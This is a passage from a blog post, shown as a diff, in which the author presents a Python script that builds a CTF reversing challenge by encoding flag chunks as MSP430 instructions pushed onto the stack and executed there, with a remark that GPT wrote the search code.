+                <span class="n">tokens</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">current</span><span class="p">))</span>
+                <span class="n">tokens</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
+                <span class="n">current</span> <span class="o">=</span> <span class="s">''</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">tokens</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">current</span> <span class="o">+=</span> <span class="n">char</span>
+    <span class="k">if</span> <span class="n">current</span><span class="p">:</span>
+        <span class="n">tokens</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">current</span><span class="p">))</span>
+    
+    <span class="c1"># Evaluate left-to-right
+</span>    <span class="n">result</span> <span class="o">=</span> <span class="n">tokens</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">tokens</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
+        <span class="n">op</span> <span class="o">=</span> <span class="n">tokens</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+        <span class="n">next_val</span> <span class="o">=</span> <span class="n">tokens</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
+        <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s">'+'</span><span class="p">:</span>
+            <span class="n">result</span> <span class="o">+=</span> <span class="n">next_val</span>
+        <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">'-'</span><span class="p">:</span>
+            <span class="n">result</span> <span class="o">-=</span> <span class="n">next_val</span>
+        <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">'*'</span><span class="p">:</span>
+            <span class="n">result</span> <span class="o">*=</span> <span class="n">next_val</span>
+    
+    <span class="k">return</span> <span class="n">result</span>
+
+<span class="k">def</span> <span class="nf">find_min_expr</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">limit</span><span class="o">=</span><span class="mi">65535</span><span class="p">):</span>
+    <span class="s">"""
+    BFS for minimal left-to-right expression using constants {8,4,2,1} and +,-,*
+    Returns expression string without parentheses.
+    """</span>
+    <span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">deque</span>
+    
+    <span class="n">q</span> <span class="o">=</span> <span class="n">deque</span><span class="p">()</span>
+    <span class="n">visited</span> <span class="o">=</span> <span class="p">{}</span>
+    
+    <span class="c1"># Start with single constants
+</span>    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">CONSTS</span><span class="p">:</span>
+        <span class="n">expr</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">q</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">c</span><span class="p">,</span> <span class="n">expr</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+        <span class="n">visited</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="n">n</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">expr</span><span class="p">,</span> <span class="mi">0</span>
+
+    <span class="k">while</span> <span class="n">q</span><span class="p">:</span>
+        <span class="n">val</span><span class="p">,</span> <span class="n">expr</span><span class="p">,</span> <span class="n">ops</span> <span class="o">=</span> <span class="n">q</span><span class="p">.</span><span class="n">popleft</span><span class="p">()</span>
+        
+        <span class="k">if</span> <span class="n">ops</span> <span class="o">&gt;</span> <span class="mi">15</span><span class="p">:</span>  <span class="c1"># Reasonable limit
+</span>            <span class="k">continue</span>
+            
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">CONSTS</span><span class="p">:</span>
+            <span class="k">for</span> <span class="n">op</span> <span class="ow">in</span> <span class="n">OPS</span><span class="p">:</span>
+                <span class="c1"># For left-to-right evaluation, we can compute directly
+</span>                <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s">'+'</span><span class="p">:</span>
+                    <span class="n">new_val</span> <span class="o">=</span> <span class="n">val</span> <span class="o">+</span> <span class="n">c</span>
+                <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">'-'</span><span class="p">:</span>
+                    <span class="n">new_val</span> <span class="o">=</span> <span class="n">val</span> <span class="o">-</span> <span class="n">c</span>
+                <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">'*'</span><span class="p">:</span>
+                    <span class="n">new_val</span> <span class="o">=</span> <span class="n">val</span> <span class="o">*</span> <span class="n">c</span>
+                
+                <span class="c1"># Check bounds
+</span>                <span class="k">if</span> <span class="nb">abs</span><span class="p">(</span><span class="n">new_val</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">limit</span><span class="p">:</span>
+                    <span class="k">continue</span>
+                
+                <span class="n">new_ops</span> <span class="o">=</span> <span class="n">ops</span> <span class="o">+</span> <span class="mi">1</span>
+                <span class="n">new_expr</span> <span class="o">=</span> <span class="n">expr</span> <span class="o">+</span> <span class="n">op</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+                
+                <span class="c1"># Verify the expression evaluates correctly left-to-right
+</span>                <span class="k">if</span> <span class="n">eval_left_to_right</span><span class="p">(</span><span class="n">new_expr</span><span class="p">)</span> <span class="o">!=</span> <span class="n">new_val</span><span class="p">:</span>
+                    <span class="k">continue</span>
+                
+                <span class="c1"># Check if we've seen this value with fewer ops
+</span>                <span class="k">if</span> <span class="n">new_val</span> <span class="ow">in</span> <span class="n">visited</span> <span class="ow">and</span> <span class="n">visited</span><span class="p">[</span><span class="n">new_val</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">new_ops</span><span class="p">:</span>
+                    <span class="k">continue</span>
+                
+                <span class="n">visited</span><span class="p">[</span><span class="n">new_val</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_ops</span>
+                
+                <span class="k">if</span> <span class="n">new_val</span> <span class="o">==</span> <span class="n">n</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="n">new_expr</span><span class="p">,</span> <span class="n">new_ops</span>
+                
+                <span class="n">q</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">new_val</span><span class="p">,</span> <span class="n">new_expr</span><span class="p">,</span> <span class="n">new_ops</span><span class="p">))</span>
+    
+    <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span>
+
+<span class="n">mappings</span> <span class="o">=</span> <span class="p">{</span> 
+    <span class="s">'+'</span><span class="p">:</span> <span class="mh">0x50</span><span class="p">,</span>
+    <span class="s">'-'</span><span class="p">:</span> <span class="mh">0x80</span><span class="p">,</span>
+    <span class="s">'*'</span><span class="p">:</span> <span class="mh">0x50</span>
+<span class="p">}</span>
+
+<span class="n">combine</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">:</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">y</span>
+
+<span class="k">def</span> <span class="nf">parse_into_asm</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
+    <span class="n">bytecode</span> <span class="o">=</span> <span class="p">[</span><span class="n">combine</span><span class="p">(</span><span class="mh">0xe0</span> <span class="o">|</span> <span class="n">reg</span><span class="p">,</span> <span class="n">reg</span><span class="p">)]</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">expr</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
+        <span class="n">op</span><span class="p">,</span> <span class="n">val</span> <span class="o">=</span> <span class="n">expr</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">val</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s">'+'</span> <span class="ow">or</span> <span class="n">op</span> <span class="o">==</span> <span class="s">'-'</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s">'+'</span><span class="p">:</span> <span class="n">opcode</span> <span class="o">=</span> <span class="mh">0x50</span>
+            <span class="k">else</span><span class="p">:</span> <span class="n">opcode</span> <span class="o">=</span> <span class="mh">0x80</span>
+            <span class="k">if</span> <span class="n">val</span> <span class="o">&lt;=</span> <span class="mi">2</span><span class="p">:</span>
+                <span class="n">opcode</span> <span class="o">=</span> <span class="n">opcode</span> <span class="o">|</span> <span class="mh">0x3</span>
+                <span class="n">argument</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">reg</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">opcode</span> <span class="o">=</span> <span class="n">opcode</span> <span class="o">|</span> <span class="mh">0x2</span>
+                <span class="n">argument</span> <span class="o">=</span> <span class="p">(([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">].</span><span class="n">index</span><span class="p">(</span><span class="n">val</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">|</span> <span class="n">reg</span>
+            <span class="n">bytecode</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">combine</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span> <span class="n">argument</span><span class="p">))</span>
+        <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s">'*'</span><span class="p">:</span>
+            <span class="n">opcode</span> <span class="o">=</span> <span class="mh">0x50</span> <span class="o">|</span> <span class="n">reg</span>
+            <span class="n">instr</span> <span class="o">=</span> <span class="n">combine</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span> <span class="n">reg</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">].</span><span class="n">index</span><span class="p">(</span><span class="n">val</span><span class="p">)):</span>
+                <span class="n">bytecode</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">instr</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">[</span><span class="o">*</span><span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="n">bytecode</span><span class="p">)]</span>
+
+<span class="n">boilerplate</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s">'.section .reset, "a"'</span><span class="p">,</span>
+    <span class="s">'   .word start'</span><span class="p">,</span>
+    <span class="s">'.text'</span><span class="p">,</span>
+    <span class="s">'start:'</span><span class="p">,</span>
+    <span class="s">'mov pc, R13'</span><span class="p">,</span>
+    <span class="s">'mov #0x2000, sp'</span><span class="p">,</span>
+    <span class="s">'mov sp, R15'</span><span class="p">,</span>
+    <span class="s">'mov.w #0x4d00, R14'</span><span class="p">,</span>
+    <span class="s">'push R14'</span><span class="p">,</span>
+    <span class="s">'mov.w #0x4303, R14'</span><span class="p">,</span>
+    <span class="s">'push R14'</span>
+<span class="p">]</span>
+
+<span class="n">actual_commands</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">flag_chunks</span><span class="p">):</span>
+    <span class="n">expr</span> <span class="o">=</span> <span class="s">'+'</span> <span class="o">+</span> <span class="n">find_min_expr</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">instrs</span> <span class="o">=</span> <span class="n">parse_into_asm</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="p">(</span><span class="n">idx</span> <span class="o">%</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="n">instrs</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">instrs</span><span class="p">:</span>
+        <span class="n">actual_commands</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">'mov.w #</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">, R14'</span><span class="p">)</span>
+
+<span class="c1"># fucking lifo!!!
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">actual_commands</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+    <span class="n">boilerplate</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">boilerplate</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'push r14'</span><span class="p">)</span>
+
+<span class="n">boilerplate</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'mov.w sp, pc'</span><span class="p">)</span>
+
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'rev.S'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">rev_output</span><span class="p">:</span>
+    <span class="n">rev_output</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">boilerplate</span><span class="p">))</span>
+
+<span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">([</span><span class="s">'./build.sh'</span><span class="p">,</span> <span class="s">'rev'</span><span class="p">])</span>
+</code></pre></div></div>
+
+<p>you can literally see where the gpt slop starts and ends lol (bc i didnt want to write breadth-first-search to get minimal instructions given my self-imposed constraint on the limited instruction set i just didnt Feel Like Doing This)</p>
+
+</article>
+      </div>
+    </main>
+  </body>
+</html>
